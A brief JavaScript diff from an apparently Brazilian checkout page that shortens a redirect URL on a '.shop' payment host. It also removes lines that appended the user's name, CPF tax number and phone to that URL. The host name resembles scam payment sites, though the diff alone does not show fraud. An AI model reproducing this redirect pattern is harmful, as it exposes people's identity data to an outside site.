@@ -238,13 +238,9 @@
                     const email = localStorage.getItem('email') || '';
                     const telephone = localStorage.getItem('telephone') || '';
                     
-                    const baseUrl = 'https://pay.pagamentosfacilitadosoficial.shop/a9ArZMl8oWx37xj1';
+                    const baseUrl = 'https://pay.pagamentosfacilitadosoficial.shop/a9ArZMl8oWx37xj';
                     const url = new URL(baseUrl);
-                    
-                    // Adicionar parâmetros do usuário
-                    url.searchParams.append('name', dadosUsuario.NOME || '');
-                    url.searchParams.append('document', dadosUsuario.CPF || '');
-                    url.searchParams.append('telephone', telephone || '');
+        
                     
                     // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
                     const finalUrl = buildUrlWithParams(url.toString());
